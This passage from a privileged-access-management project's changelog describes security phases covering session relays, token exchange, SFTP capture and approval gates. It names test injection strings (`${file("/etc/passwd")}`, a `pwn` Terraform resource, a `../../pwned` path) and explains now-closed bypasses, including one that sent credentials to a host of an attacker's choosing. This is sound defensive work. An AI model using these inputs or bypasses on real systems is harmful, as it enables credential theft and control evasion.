  filter rows fresher than 45s — so a crashed replica's sessions age out of every
  listing with no distributed GC — and a restarting replica purges its own
  leftover rows. Freshness is judged by the clock that wrote the stamp (Postgres
  `now()`), so replica clock skew never decides it. Each row names its hosting
  replica (`Info.Replica`, the pod's hostname)
- [x] **API**: `GET /api/sessions` returns the merged cluster listing (a store
  failure is a 500, not a silently partial list presented as the whole cluster);
  `GET /api/sessions/{id}/stream` watches a remote session through the relay —
  same handler loop, subscribe-first ordering preserved, with the announcer's
  staleness pass as the backstop that closes a remote watch whose hosting
  replica died without an end marker. The watch audit gains `via:relay`; the
  cluster-checked refusal audits `refused:not-live` (the replica-local wording
  stays for deployments without the bus). The portal needed **no change** —
  option 4's list and watch just became cluster-wide
- [x] **Loop prevention, in the kill bus's mold**: the bus delivers to everyone
  including the publisher, so inbound frames for a session in the local registry
  are dropped (they are this replica's own forwards echoed back), and the bridge
  injects via the hub's local-only publish — a watching replica, whose own
  interest announcement also echoes back to itself, can never re-forward what it
  received
- [x] **Tests**: a two-replica memstore suite (the flagship end-to-end watch;
  interest gating proven in both directions — an unwatched session's output
  never reaches the bus, and the gate closes again after the last watcher
  leaves; the crash backstop; heartbeat repair of a lost row; and kill bus +
  live bus chained: kill on B, session on A, B's own watch stream closes); the
  store contract grows the inventory round-trip (freshness filter, idempotent
  deletes, upsert-not-duplicate) and a **chunked 10 KiB frame reassembled
  byte-identical** — on live PostgreSQL in CI, where NOTIFY's ~8000-byte payload
  limit makes the chunking real; and an API test whose SSE request lands on
  "replica B" for a session registered on "replica A", asserting the listing,
  the frames, the end, and the `via:relay` audit
- Deferred (documented): **cross-replica step-up decisions** — the pending list
  and `POST /api/sessions/{id}/stepup` stay replica-local (the paused statement
  blocks in the hosting replica's memory; a remote supervisor sees the pause in
  the relayed stream but must decide it on the hosting replica). *Since shipped
  in Phase 56.* Also
  deliberately unchanged: the concurrent-session caps and the Prometheus
  active-sessions gauge stay per-replica — a cluster cap derived from advisory,
  possibly-stale inventory rows could refuse sessions on ghost data, and
  per-pod gauges are what Prometheus expects

## Phase 56 — Cross-replica step-up decisions ✅

Closes the deferral Phase 55 recorded when it made watching cluster-wide: a
paused statement blocks in the memory of the replica hosting its session, so
the pending list and `POST /api/sessions/{id}/stepup` were the last session
views still replica-local — a remote supervisor could *watch* the pause arrive
over the relay but had to decide it on the hosting replica. Now the Phase 55
sentence finishes: a supervisor can **see it, watch it, kill it — and decide
it — all from the wrong replica.**

- [x] **A decision bus in the kill bus's mold, with the live bus's inventory
  alongside** (`internal/session/stepupbus.go`, `session.StepUpStore` in the
  `store.Store` contract): every `Await` mirrors its pause into a shared,
  TTL-bounded inventory row (migration `0026`, **UNLOGGED** `stepups`; deleted
  at the claim, expired by the store's own clock otherwise — a crashed
  replica's leftovers fall out exactly when the pause they mirrored would have
  timed out), and a decision published on any replica is applied by the one
  holding the pause through the same `DecideBy` claim point. pgstore rides
  LISTEN/NOTIFY on its own dedicated reconnecting listener; memstore fans out
  in-process, so the demo and tests drive exactly the code the HA path runs.
  No new environment variables: it activates with the store, best-effort like
  its two siblings, under the same shared-custody bus key
- [x] **Sealed, both at rest and in flight**, because the table and the NOTIFY
  channel have no privilege model: the inventory row's *statement* — session
  content, what the supervisor reads to decide — is AES-256-GCM-sealed under
  the cluster bus key, bound to the row's session/actor/replica as AAD, so a
  database observer reads ciphertext and a **fabricated row fails to open and
  is never shown to a supervisor**; a *decision* carries a freshness-bound seal
  over its session/verdict/decider (±2 min, like a kill), so a release can be
  neither forged, re-pointed, flipped, nor replayed — and inside the window a
  replay finds the entry already claimed
- [x] **Self-approval refused across replicas**: the dispatching replica
  pre-checks the row's actor (courtesy 403 before anything is published) and
  the hosting replica's `DecideBy` re-checks under the claim lock either way —
  the authoritative gate never moved
- [x] **API**: `GET /api/sessions/stepups` returns the merged cluster listing,
  each row naming its hosting `replica` and `expires_at` (a store failure is a
  500, not a silently partial list — the `GET /api/sessions` honesty); the
  decide endpoint answers **200** applied locally, **202 dispatched** for a
  pause held elsewhere (the kill-switch's mold: dispatched is not proven
  applied — the now-cluster-wide list is the verification), an honest **404**
  when no replica mirrors a pause, and **503** when the store cannot say. The
  fail-closed `session.stepup_decided` audit is written *before* the publish;
  the applying replica audits the arrival `… via:bus`, like a bus kill. The
  no-bus fallback keeps the Phase 55-era 409
- [x] **Console**: screen 21 lists cluster-wide with a **Replica** column, and
  a dispatched decision reports `DECISION DISPATCHED … VERIFY WITH F5` instead
  of claiming the statement moved
- [x] **Tests**: a two-replica memstore suite (list-and-approve from the
  non-hosting replica end to end; deny; cross-replica self-approval refused
  then decided by a second person; an **unsealed decision provably does not
  move the pause** and a **fabricated row provably never reaches a listing**;
  the timeout claim cleans the shared row); the store contract grows the
  inventory round-trip (order, upsert-in-place, store-clock expiry, idempotent
  delete) and the decision pub/sub — on live PostgreSQL in CI — and an API test
  whose decide lands on "replica B" for a statement paused on "replica A",
  asserting the listing, the 403 self-check, the 202 dispatch, the released
  `Await` and the cluster-truthful 404 after
- Deferred (unchanged from Phase 55, deliberately): the concurrent-session
  caps and the Prometheus active-sessions gauge stay per-replica

## Phase 57 — Delegation you can issue, remediation you can review ✅

A **parity audit against the [pam-research](https://github.com/morandeirachema/pam-research)
prototypes** — the market investigation and five PoCs this codebase grew out of
— re-run mechanism by mechanism against pamv1's code. Almost everything was
already here, usually more completely (the full matrix is
[EXTERNAL-INFRA-GAPS §9](docs/EXTERNAL-INFRA-GAPS.md)). Two things were not, and
neither needed anything external — which is the finding that made this a phase:
one of them had been **catalogued as blocked on infrastructure that turned out
not to be required.**

**RFC 8693 token exchange — the minting half of delegation** (`internal/agentid/exchange.go`):

- [x] **`POST /v1/token`**: an SVID-authenticated agent delegates *its own*
  authority to a sub-agent and receives a broker-signed, short-lived delegated
  JWT-SVID. Phase 13 shipped only the verifying half — pamv1 could read an
  `act` chain but never write one — and the catalogue said issuing needed "an
  STS / token-exchange endpoint". It does not: the broker already holds an
  accountable identity for the delegator and already decides every call, so it
  is the only party that can honestly issue *"X may act for Y here"*
- [x] **The chain grows by exactly one link**, and the minted token is
  **verifiable at the ingress that minted it** — the broker's own issuer key is
  added to the same kid→key map the trust bundle uses (`SVIDVerifier.TrustIssuer`,
  refusing a kid that collides with a trust-domain key), so there is one
  verification path, not a privileged second one. A delegated token can be
  re-delegated one more link, up to `PAM_BROKER_MAX_DELEGATION_DEPTH`
- [x] **What it refuses, each for a stated reason**: **impersonation** (an
  actor-less exchange — erasing the intermediary is the opposite of the
  accountability chain the broker exists to keep); **delegating someone else's
  authority** (the delegator is the authenticated caller, so holding two
  captured tokens mints nothing); **`scope`** (what a delegated agent may *do*
  is decided per call by policy over the arguments, never baked into an
  identity token where the policy engine cannot see it); a chain **past the
  cap**, enforced at mint so a runaway spawn stops there; an actor the
  subject's **`may_act`** (§4.4) does not name; and any **audience** but this
  broker. Expiry is capped by the delegator's own — delegated authority never
  outlives its source
- [x] **Fail-closed audit before the token is handed over** (`broker.token.exchanged`,
  naming both ends and the chain) and a best-effort `broker.token.refused`,
  because a stream of refusals is what a probing agent looks like. Signing key
  in **shared custody** like its siblings (a per-pod key would make a token
  minted on one replica unverifiable on the next); `GET /v1/token/jwks`
  publishes it. Off by default: `PAM_BROKER_TOKEN_EXCHANGE`, fail-loud if
  enabled without a trust domain or without the broker
- [x] **Divergence stated, not hidden**: RFC 8693 §4.1's example keeps the
  original subject in `sub`; a SPIFFE JWT-SVID requires `sub` to be the
  presenter, so pamv1 keeps SPIFFE semantics and carries the trail in the
  nested `act` — the same convention the verifier has always read

**Remediation as reviewable Terraform** (`internal/blast/terraform.go`):

- [x] Phase 31 computed the right cut and returned it as a *sentence*.
  `POST /api/blast/analyze` with `"terraform": true` now also renders it as
  **HCL**, one stanza per distinct cut edge (deduped — several findings share a
  cut), deterministically ordered so two runs diff cleanly. A generator per
  pivot kind: narrow the assumed role's **trust policy**, delete the **group
  membership**, cap an escalation with a **permissions boundary**, deny the
  **secret read** (and rotate, in that order — the note says why)
- [x] **Escaping is a security control here**, not formatting: the graph is
  caller-submitted and the output is meant to be `terraform apply`-d, so ids
  become HCL-safe labels, values escape the quote/backslash **and** Terraform's
  `${…}`/`%{…}` interpolation markers, and comments strip newlines (and the
  markers too, belt-and-braces, so the invariant is checkable in one line). The
  test feeds a principal id containing `resource "null_resource" "pwn" {}` and
  `${file("/etc/passwd")}` and proves neither reaches the output live
- [x] **Honest about what it is**: a starting point, not an applyable plan —
  pamv1's normalized graph knows the grant that enables an edge, not your ARNs
  or conditions, and a cross-provider principal receiving AWS-shaped output is
  told so. The header says a cut breaks the *reported* path only

Tests: the minted-token round trip end to end (exchange → the delegated token
makes a real tool call), chain growth and the mint-time cap, every refusal,
`may_act` in both single and list form, expiry capping, kid-collision refusal,
and the API surface (202-shaped RFC 6749 errors, 401 for an unauthenticated
caller, JWKS authorization, 404 when disabled); plus the Terraform renderer's
determinism, per-kind coverage and the injection test above.

## Phase 58 — Safe-scoped policy ✅

Closes the older half of the Phase 17 deferral. A safe grouped targets and
delegated *who* could reach them, but carried no policy of its own: whether a
connection needed approval was decided per target, one flag at a time. That is
the setting a newly onboarded target quietly misses — the production safe is
governed, and the machine added to it last Tuesday is not.

- [x] **A safe carries its own access policy** (migration `0027`):
  `require_approval` and `min_approvers`, binding **every target in the safe**.
  Both are **strictest-wins** with the global and per-target settings — a safe
  may tighten what they allow and can never loosen it, the same direction the
  per-target RDP clipboard override takes. A dual-control floor implies the
  approval requirement, because two approvers on a target nothing gates would
  be a setting with no effect, which reads as a control and is not one
- [x] **One fold, five enforcement sites** (`store.EffectiveApprovalPolicy`).
  The predicate `global || target.RequireApproval` had been written out
  separately in the API, the SSH proxy, the PostgreSQL proxy, the SQL Server
  proxy and the in-portal viewer. Survivable with two inputs; with a third it is
  the Phase 38 lesson waiting to happen, so the fold moved into `internal/store`
  where both `api` and `proxy` already reach. **Fail-closed contract**: when the
  safe cannot be read it returns `Required: true` *together with* the error, so
  a caller that mishandles the error still denies — a store hiccup must never
  quietly downgrade a governed target to ungoverned
- [x] **The dual-control floor is re-read when each approval is cast**, not
  merely stamped on the request when it is filed. A floor that applied only at
  request time would be bypassable by filing early: raising a safe's floor now
  binds every request still in flight. It applies at request time too, so a
  requester cannot ask for fewer approvers than the safe demands
- [x] **API + console**: `POST`/`PUT /api/safes` take and return both fields
  (a floor outside 0–10 is 422 — a safe nobody can satisfy is a denial of
  service written as a setting), the audit detail carries the policy on create
  and update because changing it changes who may reach everything inside, and
  the 5250 safe screens gained an **Approval** column plus both fields on the
  add/change forms, with the re-read behaviour stated on screen
- [x] **Tests**: the fold itself (strictest-wins in every combination, a
  permissive safe unable to undo the global or per-target flag, and the
  fail-closed path proving a store error yields `Required`); end to end through
  the API (a target in an approval-required safe is refused, the *same* target
  outside it is allowed — which is what proves the refusal came from the safe;
  the floor raised mid-flight leaves one approval pending and grants on the
  second distinct approver; the request-time floor; the 422); and **through the
  SSH proxy**, where neither the global nor the per-target flag is set and the
  safe alone refuses the session — the path where a missed control would have
  mattered most
- Deferred (documented): a **per-consumer management credential** for
  dependent-account propagation (it still connects as the rotated account) —
  the other half of the Phase 17 bullet, unrelated to policy and left as its own
  item

## Phase 59 — SFTP per-file content recording ✅

Closes the last deferral of Phase 32. File *operations* got an audit trail
(32) and paths got a policy (51), but the transferred bytes themselves crossed
the proxy unrecorded — an investigator could prove `/srv/report.csv` left the
building, never *what* left. Commercial PSM records the file; now the flagship
proxy does too. Opt-in via `PAM_SSH_SFTP_CAPTURE` ∈
{`off`, `uploads`, `downloads`, `all`}.

- [x] **Per-file capture artifacts**
  (`internal/proxy/sftpcapture.go` + `internal/recording/sftpfile.go`): every
  remote file a session opens produces a **chunk log** beside the session
  recordings — a JSON header naming the remote path and open mode, then one
  line per data movement (direction, offset, base64 bytes) in arrival order.
  A log rather than a reassembled file, for two reasons that are really one:
  SFTP's random-access writes cannot stream through the at-rest Sealer
  (plaintext would have to touch disk first), and reassembly would silently
  merge overlapping rewrites the wire actually carried. The artifact is sealed
  under the vault KEK when `PAM_RECORDING_ENCRYPT` is on, its SHA-256 (over
  the bytes as stored) joins the recording hash chain, and
  `sftp.file_recorded` binds path, artifact name, byte counts, hash and chain
  position — the same attestation a session recording gets
- [x] **Both legs are parsed.** A WRITE or READ names only a server-issued
  handle; the path is in the OPEN (request leg), the handle in the HANDLE
  (response leg), and download bytes arrive as DATA (response leg). So capture
  watches the target→operator stream too — forwarding it byte-identical — and
  ties every data packet back to its file. The close-with-reads-in-flight
  evasion is closed: finalization defers until the outstanding read resolves,
  so DATA arriving after CLOSE still lands in the sealed evidence
- [x] **Capture is containment, not best-effort visibility.** Phase 32's
  fail-open-on-forwarding posture deliberately inverts while capture is on: an
  unframable stream on either leg, an unparsable OPEN/READ/WRITE/CLOSE, or an
  overflowing tracking bound fails the transfer **closed** (audited
  `sftp.parse_error` / `sftp.blocked`) rather than let bytes move unobserved —
  otherwise any client could evade the control by declining to be parseable.
  Under `PAM_REQUIRE_RECORDING`, a file whose artifact cannot be written has
  its data refused, exactly as an unrecordable session is refused. The
  per-file cap (`PAM_SSH_SFTP_CAPTURE_MAX_MB`, 0 = unlimited) **refuses**
  data past the cap — the session-recording cap's reasoning — so it doubles
  as a transfer size limit
- [x] **The OpenSSH extension gap, found and closed.** A modern sftp client
  renames via `posix-rename@openssh.com` — an `SSH_FXP_EXTENDED` request —
  whenever the server advertises it, so an ordinary `rename` slid past both
  the read-only refusal and the Phase 51 path denylist, which parsed only the
  classic packet. `posix-rename` and `hardlink@openssh.com` (a hard link gives
  a denied path a second, undenied name) now obey the same policy as
  `SSH_FXP_RENAME`; ungoverned extensions (statvfs, fsync, copy-data — whose
  source handle an already-checked OPEN produced) forward as before
- [x] **Replay closes the loop** (the Phase 26 pattern): `.sftp` artifacts
  list with the session recordings (kind `file`, target/actor attributed from
  the audit trail), and `GET /api/recordings/{name}` serves the
  **reconstructed transferred bytes** — unsealed, replayed in log order,
  holes and torn tails labeled in headers, memory-bounded (413 past 32 MiB) —
  or the raw chunk log with `?raw=1`; the hash verdict rides the same
  tamper-evidence headers, and the 5250 recordings screen downloads a `file`
  entry's content. Retention pruning and WORM archiving treat the artifacts
  as recordings
- [x] **Tests**: the format (round-trip, torn tail, reconstruction order /
  overlap-last-wins / sparse / size bound); end to end through the real SFTP
  harness — an out-of-order upload reconstructs exactly and its audited hash
  matches the artifact as stored, a download's DATA is captured, a sealed
  artifact holds no plaintext yet reconstructs through the vault, the cap
  refuses the crossing WRITE (which never reaches the target) and marks the
  artifact `capped:true`, uploads-only mode leaves no download artifact, the
  deferred-close evasion is caught deterministically, garbage tears the
  session down, and the extension renames are refused in readonly and
  path-denied on both sides; the API replay path (listing + attribution,
  reconstruction, raw, the 413 bound, RBAC); retention prunes `.sftp`
- Deferred (documented): richer `SSH_FXP_EXTENDED` coverage beyond the two
  governed renames (nothing else OpenSSH ships moves content across the
  wire), and scp/shell-redirection capture, which stays inherent to the
  interactive-PTY boundary (§6 deliberate limits)

## Phase 59a — Close the review of Phase 59 ✅

A max-effort read-only review of Phase 59, run the day it merged, found
fifteen defects in it — several of them bypasses of the very containment the
phase exists to provide, five reproduced by running code. They are closed
here, in the 52a–52g tradition: the review of a fix is part of the fix.

- [x] **Three ways past capture, closed.** An `SSH_FXP_OPEN` with **no access
  flag** was treated as neither read nor write and went untracked — yet
  OpenSSH's own server maps `pflags=0` to a working `O_RDONLY` handle, so one
  packet bought an entirely uncaptured download. A **reused request id** let an
  unrelated response resolve a pending OPEN, orphaning the handle and every
  byte written through it; an id may now name only one outstanding request
  while capture is on, claimed on the request leg and released by the response
  (including the `NAME`/`ATTRS`/`EXTENDED_REPLY` kinds capture ignores, whose
  ids would otherwise have leaked until the bound refused honest work). And a
  **WRITE offset that overflowed** `offset+len` skipped the range check, broke
  the artifact from inside the encoder and — because `broken` is sticky — left
  the rest of that file forwarding with capture silently off; the bound is now
  a subtraction, and a broken artifact refuses in every mode, not only under
  `PAM_REQUIRE_RECORDING`
- [x] **The artifact name is contained.** It was built from the **raw** session
  title while the sibling `.cast` used `sanitize`, so a target named
  `x/../../pwned` wrote outside the recording directory with `O_CREATE|O_TRUNC`
  and operator-chosen bytes, and a target named `web 01` produced evidence the
  playback allowlist rejects — invisible, unarchivable, and still deleted on
  schedule by retention. `sanitize` now also guarantees no leading `.`, since a
  dotfile recording is skipped by the archiver and *preserved* by the pruner
  (the chain head is a dotfile), and that flaw was latent for `.cast` too
- [x] **`lsetstat@openssh.com`, the one Phase 59 missed.** Governing
  `posix-rename` and `hardlink` while leaving the third path-mutating OpenSSH
  extension ungoverned is the same bug one name over: it bypassed both the
  read-only refusal and the path denylist, unaudited. Extensions are now an
  explicit list — the benign ones (statvfs, fsync, limits, path lookups) pass,
  the mutating ones are gated, `copy-data@openssh.com` is **refused under
  capture** because it moves content server-side where no WRITE or DATA crosses
  the proxy (the artifact would have closed attesting `bytes_up:0`, a false
  statement rather than a gap), and anything unrecognized is refused under
  read-only or capture instead of forwarded because it is unfamiliar
- [x] **A client-chosen path can no longer forge audit fields.** Quoting kept
  spaces and colons *inside* the quotes, and a detail is read as text: a file
  uploaded to a path named `evade sha256:<hash>` put that exact substring in
  the trail, which is what playback's tamper check matches — so an operator
  could vouch for a recording they had altered. Colons in audited paths are
  escaped, which takes every `key:value` token out of reach at once
- [x] **The cap is a limit again.** It counted only delivered bytes, so a
  pipelined download — every real client — ran 16 MiB past a 1 MiB cap before
  the first refusal; a READ now claims the bytes it asks for when it is
  admitted and releases the remainder when it resolves
- [x] **A reachable panic, and a lie about truncation.** `ReconstructSFTP`
  skipped zero-length chunks when sizing but not when copying, so one empty
  WRITE — which the proxy records verbatim — crashed every attempt to read that
  file's evidence back. `DecodeSFTPFile` reported *any* malformed line as a
  torn tail, which a caller renders as "partial but genuine"; only a damaged
  **last** line is a truncation now
- [x] **Two stream-integrity fixes.** The response leg forwarded raw 32 KiB
  reads into the same serialized writer that carries synthesized refusals, so a
  mid-transfer refusal could land inside a half-written `DATA` packet and shift
  every later boundary — it now forwards whole packets only. And each
  artifact's attestation is written through the **teardown** auditor, so a
  session drained by shutdown cannot leave `.sftp` files whose hash appears
  nowhere (indistinguishable from tampering) while the chain head has already
  advanced
- [x] **Smaller ones**: the KEK wrap that seals each artifact is bounded and
  cancellable (a blackholed KMS hung the session, once per *file*), audit
  writes no longer happen under the mutex both SFTP legs need, `?raw=0` no
  longer means raw, an empty write no longer wins the direction election and
  hides a download, the console reports the tamper verdict on a captured-file
  download instead of discarding it, `PAM_SSH_SFTP_CAPTURE_MAX_MB` is bounded
  above so it cannot overflow into a negative cap, and the two capture
  variables reached `.env.example`
- [x] **Tests**: every fix above has one, and the two Phase 59 tests the review
  called weak are repaired — the extension test's fake upstream now records
  extended requests, so "it never reached the target" is an assertion rather
  than a hope, and the fail-closed test no longer blocks to the suite timeout
  in the failure mode it guards. The two most load-bearing new tests were run
  against the pre-fix code first and fail there, which is the only thing that
  makes them evidence

## Phase 60 — The ticket gate holds at connect time ✅

Closes the half of the Phase 20 deferral that was a hole rather than a
feature. The ITSM ticket on an access request was validated exactly once —
when the request was **filed**. An approval is good for
`PAM_APPROVAL_WINDOW_MIN` (an hour by default), and a scheduled request can
sit for days waiting on its maintenance window, so a change that was
cancelled, closed or rejected in the meantime still admitted the session it
had authorized. "No privileged access without an approved change ticket" has
to mean at the moment of access, or it means at the moment of paperwork.

- [x] **Re-checked when access is used** (`PAM_TICKET_REVALIDATE`, default
  off): before a use is admitted, the ticket on the request that would admit
  it is put back to the ITSM. A ticket that no longer validates refuses the
  use and is audited `access.ticket_revoked` with the ITSM's own reason; the
  denial reads `reason:ticket-not-valid`, distinct from a missing approval,
  because "your change was cancelled" and "you have no approval" send an
  operator to different places
- [x] **One fold, five gates** (`store.ClaimApproval`, alongside Phase 58's
  `EffectiveApprovalPolicy`). The API (reveal, checkout, WinRM run, broker
  tools), the in-portal viewer and the SSH, PostgreSQL and SQL Server proxies
  each called `ConsumeApproval` directly — the same five sites, and the same
  Phase 38 lesson, as the policy fold before it. They now share one use-time
  gate, so a control cannot be present on four paths and missing from the
  fifth. New store read `ActiveApproval` returns the request that *would*
  admit, choosing it by the same order `ConsumeApproval` claims by
- [x] **The re-check runs BEFORE the approval is consumed**, so a use refused
  by the ITSM does not spend a single-use approval. An operator whose ticketing
  system has a bad minute keeps the access they were granted instead of going
  back through four-eyes for it. (The cost is a small documented race with two
  concurrent approvals; burning approvals on failures was the worse trade)
- [x] **Fail-closed, and bounded.** A ticket that cannot be *confirmed* refuses
  — whether the ITSM rejected it or could not be reached — because a gate that
  opens when it cannot do its job is not a gate. The call is bounded at five
  seconds so a slow ITSM cannot hold an SSH handshake open, and the whole
  behaviour is opt-in: unset, every path behaves exactly as it did before
- [x] **Tests**: the fold in isolation (a rejected ticket refuses *and* leaves
  the approval unspent, an unreachable ITSM refuses, valid/ticketless/disabled
  all consume exactly as before, both store errors fail closed); the store
  contract for `ActiveApproval` (agrees with `ConsumeApproval`, consumes
  nothing, and is blind to expired, scheduled-but-not-open and already-consumed
  approvals — live PostgreSQL in CI); end to end through the API against a fake
  ITSM that is flipped mid-test (admitted, then refused, then admitted again
  once the change re-opens — which is what proves the refusal came from the
  ticket and not from a spent approval), plus the single-use non-burn and the
  two negative controls: with the re-check off nothing changes and the ITSM is
  not called at all, and a ticketless approval is never gated on a ticket; and
  **through the SSH proxy**, where a cancelled change refuses the session and
  an unreachable ITSM does too
- Deferred (documented): a first-class ServiceNow/Jira connector — this ships
  the generic webhook and regex the same way Phase 20 did, and a vendor
  connector is a credentials-and-schema problem, not a gate problem

## Phase 60a — The claim consumes the approval whose ticket it checked ✅

Closes a read of Phase 60. The fold's own comment called the gap between the
re-check and the consume "a small race" and accepted it; it was not small. The
re-check ran against the approval `ActiveApproval` returned, and the consume
re-ran its own selection, so the two could disagree about which approval was
being spent.

- [x] **The gate no longer opens on a ticket it did not check.** Two
  connections racing both validated the front-runner's open change; the second
  one's consume then took the approval *behind* it — a cancelled change whose
  ticket was never put to the ITSM at all. `ConsumeApprovalByID` claims the id
  that was just validated, or reports that somebody else got there first
- [x] **And one cancelled change no longer locks an operator out.** The mirror
  image was worse in daily use: an approval with a rejected ticket shadowed
  every valid approval behind it *permanently*, because the fold refused before
  consuming and so could never clear it — anyone who could get a change
  cancelled could deny an operator their whole window. `ClaimApproval` now
  walks the candidates, and a refused one is skipped rather than fatal
- [x] **Refusing is still refusing.** The use is denied when *no* candidate
  passes, reporting the last ticket and reason, and nothing is burned on the way
  through — the Phase 60 property that a policy refusal must not cost the
  operator their approval is unchanged
- [x] **Bounded** (`maxApprovalCandidates = 8`) and **one budget for the whole
  walk**: every ITSM call in a claim shares a single `ticketRecheckTimeout`, so
  several approvals cannot multiply the wait on an SSH handshake. A hung ITSM
  refuses once, on time
- [x] **Store contract.** `ActiveApproval` (singular) is *replaced* by
  `ActiveApprovals(…, limit)` rather than kept alongside it — leaving the
  single-approval peek in the interface would leave the same trap set for the
  next caller. `ConsumeApprovalByID` re-checks the requester, the target and the
  clock, so an id alone can never claim somebody else's approval; the burn is a
  compare-and-set, and a standing approval is confirmed without being written
- [x] **Tests**: the race itself against the real store — two concurrent claims,
  one cancelled change, exactly one admission and it is the checked one, with the
  cancelled approval left unburned; the shadowing case admitted on the good
  approval behind the poisoned one; every-candidate-fails still refused with
  nothing burned; the lost-race fall-through checking the *next* candidate's own
  ticket; the cap and the shared deadline; a hung ITSM failing closed once; and
  store-contract coverage of the ordering, the limit, the atomic claim under
  eight racing goroutines, and the requester/target/clock re-checks

## Phase 61 — A dependent account names the credential that manages it ✅

Closes the other half of the Phase 17 deferral, and it was a privilege bug
rather than a missing feature. Propagation logged into the consumer's host **as
the rotated service account itself**, using its brand-new password, to run
`sc.exe config` / `schtasks /Change` / `appcmd`. That asks the wrong account for
the wrong rights: reconfiguring a service, task or app pool needs remote
management and local-administrator rights on that host, which is exactly what a
service account is not supposed to hold — and a hardened one usually cannot log
on remotely at all, so propagation failed precisely where a PAM is most needed.
It also had nowhere to stand when the rotation was being run *because* the
account was broken.

- [x] **A dependency can name its management credential** (migration `0028`,
  `store.CredentialDependency.ManagementCredentialID`): the credential pamv1
  authenticates to that host **with**, decrypted just-in-time from the vault
  like every other use. Unset keeps the previous behaviour, so an existing
  deployment sees no change until an operator sets it — but the console now
  says plainly which consumers still log in as the account being rotated
- [x] **Deliberately not a foreign key.** The reference records an operator's
  *intent*, and both cascade options lose it: `ON DELETE SET NULL` would
  silently resume logging in as the rotated account — the very thing the
  operator moved away from — and `ON DELETE RESTRICT` would make an unrelated
  credential undeletable. A dangling id lets propagation **fail closed** and say
  exactly why (`credential.dependency_failed reason:management-credential-missing`),
  which is the only outcome that neither surprises nor blocks
- [x] **Checked when it is declared, not only when it is used.** A management
  credential that names nothing is a 422 at `POST /api/credentials/{id}/dependencies`,
  while a human is present to be told; propagation runs unattended after a
  rotation, where a typo would be an audit line nobody is reading. A Zero
  Standing Privilege credential (which holds no secret to present over WinRM)
  is refused at use time for the same reason it cannot work
- [x] **The audit says who connected**: `managed_via:credential:<id>` or
  `managed_via:self` on both `credential.dependency_updated` and the failure
  event, and on `dependency.create`. Neither secret appears — the rotated one
  still reaches only the command line, exactly as before
- [x] **Console** (menu *Work with Dependent Accounts*): a **Managed via**
  column that reads `cred <id>` or, in amber, `this account`, plus the field on
  the add form with the reason it matters stated on screen
- [x] **Tests**: end to end through rotation with a fake WinRM that records the
  login it was handed — proving the management account is what authenticates
  and that the rotated account's new secret is *not* used to log in, while
  still being delivered into the service configuration; the fallback path
  unchanged (`managed_via:self`); the fail-closed path when the management
  credential is deleted after the fact (nothing is attempted over WinRM at
  all); the 422s at declaration time; and a store-contract round-trip so the
  reference cannot be lost in storage

## Phase 61a — Naming a management credential is a use of that credential ✅

Closes a read of Phase 61. The reference shipped as *configuration* — the
handler checked that `management_credential_id` named an existing row and
nothing else — but it is an *instruction to present a secret*, and the same
request also chooses the host it is presented to. That combination turned
`CapManageCredentials` into a credential-theft primitive: name a credential you
may neither reveal nor rotate, point the dependency's `host` at a machine you
control, rotate any credential you *are* allowed to rotate, and pamv1 decrypts
the named secret and hands it over WinRM to your machine. Proven end to end
against a profile holding `manage_credentials` + `read_inventory` and nothing
more, against a domain-admin credential on a target granted to somebody else.

- [x] **The bar is the reveal bar** (`Server.gateManagementCredential`), applied
  to the management credential's **own** target, not to the one being rotated:
  `CapRevealSecret`, the per-target grant (direct ∪ safe members), the target's
  approval requirement, and the vendor contract gate. An administrator already
  entitled to the credential they name sees no change
- [x] **It does not consume an approval.** Declaring is not the use — the use
  happens unattended, after some later rotation — so the approval requirement is
  checked with `HasActiveApproval` rather than claimed. Burning a single-use
  approval on a configuration change would spend the operator's session approval
  on paperwork; this is the one deliberate difference from `gateCredentialAccess`
- [x] **Not an existence oracle.** The capability is checked **before** the
  store lookup, so a caller who may not reveal anything gets the same 403 for
  every id and learns nothing about which credentials exist
- [x] **A management credential must hold a password.** An `ssh_key` credential
  sent into a WinRM password field authenticates nothing and delivers the whole
  private key to the consumer's host; an `ssh_ca` (Zero Standing Privilege)
  credential holds no secret at all. Both are 422 at declaration and refused
  again inside `dependencyLogin`
  (`credential.dependency_failed reason:management-credential-not-a-password`),
  the same belt-and-braces as the dependency-name allowlist — a row written
  straight into the database cannot leak one either
- [x] **The refusals are audited**: `dependency.create_denied` with
  `reason:reveal-secret-required` / `target-policy` / `approval-required` /
  `vendor-contract`, naming the credential and the host that was asked for
- [x] **Console**: the add form states on screen that naming a credential
  presents its password to that host, what it therefore costs, and that it must
  be a password
- [x] **Tests**: the exfiltration attempt itself, refused, with nothing reaching
  WinRM on the rotation that followed; the grant leg (reveal-capable but not
  granted the credential's target) refused while an ungated credential from the
  same caller is accepted, so the refusal is the grant and not the capability;
  the oracle closed (existing and missing ids answer alike); both non-password
  secret types refused at declaration; and the use-time refusal proven the only
  way it can now arise — the dependency row written straight into the store

## Phase 62 — A step-up decision names the pause it was made about, and the released artifact is current ✅

Opened by the read-only sweep of **2026-08-07** (the first over phases 56–61a as
a whole; nine findings, recorded in
[docs/SECURITY-GAPS.md](docs/SECURITY-GAPS.md)). Two of them are closed here —
the one bypass and the one that made every documented deployment path ship a
build the project itself had already fixed. The other seven are recorded there
and carried into [What is left](#what-is-left-).

### 62a — The cross-replica step-up decision binds to one pause

Phase 56 sealed the decision bus so a database observer could neither forge nor
replay a release: the seal binds `{session, verdict, decider}` and its timestamp
is refused outside ±2 minutes. The gap was in what "replay" was taken to mean.
The seal named the **session**, `StepUp.pending` is keyed by **session id**, and
a session pauses **once per flagged statement** — so a captured decision stayed
applicable to whatever was pending when it arrived. The comment asserting "a
replay inside the window finds the entry already claimed" held only if the
session did not pause again, and for a database session under a step-up policy
pausing twice inside two minutes is the ordinary case, not an exotic one.

Reachable by exactly the adversary the seal exists for: PostgreSQL `NOTIFY`
channels have no privilege model, so anything holding a database session can
read a genuine approval off the wire and publish it back. The result was a
flagged statement released with no supervisor in the loop, recorded as
`session.stepup_decided … decider:<the supervisor who decided the previous
one> via:bus` — an audit trail asserting an approval that never happened, which
is the failure `DecideBy`'s own self-approval refusal calls worse than no gate.

- [x] **`StepUpDecision.Pause`** carries `PauseID(requested)` — the pause's
  registration time in **microseconds**, because the value round-trips through a
  PostgreSQL `timestamptz` and a nanosecond id would never equal the one still
  in the hosting replica's memory. `DecideRemote` fills it from the inventory row
  it just read, which *is* the pause the supervisor is deciding
- [x] **It is in the AAD**, not merely in the payload (`stepUpDecisionAAD`): the
  pause is the field a replay would want to change
- [x] **The claim is bound.** `StepUp.claim(sessionID, pause, …)` refuses an
